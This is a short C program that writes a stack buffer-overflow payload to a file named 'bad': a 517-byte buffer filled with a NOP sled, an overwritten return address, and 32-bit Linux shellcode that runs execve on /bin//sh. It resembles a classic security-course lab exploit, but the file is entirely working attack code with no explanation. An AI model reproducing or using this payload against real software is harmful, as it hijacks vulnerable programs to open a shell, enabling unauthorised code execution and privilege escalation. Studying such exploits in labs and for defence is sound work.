#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const char code[] =
	"\x31\xc0"	/* xorl		%eax, %eax	*/
	"\x50"		/* pushl	%eax		*/
	"\x68""//sh"	/* pushl	addr		*/
	"\x68""/bin"	/* pushl	addr		*/
	"\x89\xe3"	/* movl		%esp, %ebx	*/
	"\x50"		/* pushl	%eax		*/
	"\x53"		/* pushl	%ebx		*/
	"\x89\xe1"	/* movl		%esp, %ecx	*/
	"\x99"		/* cdq				*/
	"\xb0\x0b"	/* movb		$0x0b, %al	*/
	"\xcd\x80"	/* int		$0x80		*/
	;

int
main(int argc, char *argv[])
{
	FILE *badfp;
	char buf[517];

	/* fill with NOPs */
	memset(&buf, 0x90, sizeof(buf));

	/* place return address */
	*((long *)(buf + 0x24)) = 0x7fffffffe670 + 0x60;

	/* write shellcode at the end of buf */
	memcpy(buf + sizeof(buf) - sizeof(code), code, sizeof(code));

	/* save to badfp */
	if ((badfp = fopen("bad", "w")) == NULL)
		err(1, "fopen(bad)");
	fwrite(buf, sizeof(buf), 1, badfp);
	fclose(badfp);

	return (0);
}
